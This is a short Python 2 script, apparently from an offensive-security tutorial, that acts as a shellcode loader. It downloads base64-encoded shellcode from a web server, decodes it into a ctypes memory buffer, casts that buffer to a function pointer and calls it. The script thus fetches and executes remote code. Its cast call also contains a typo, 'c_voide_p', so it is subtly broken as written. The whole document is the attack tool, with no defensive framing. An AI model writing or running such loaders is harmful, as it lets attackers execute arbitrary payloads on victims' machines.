import urllib2
import ctypes
import base64

# Retrieve the shellcode from our web server

url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

# Decode the shellcode from base64

shellcode = base64.b64decode(response.read())

# Create a buffer in memory

shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# Create a function pointer to our shellcode

shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_voide_p))

# Call our shellcode

shellcode_func()


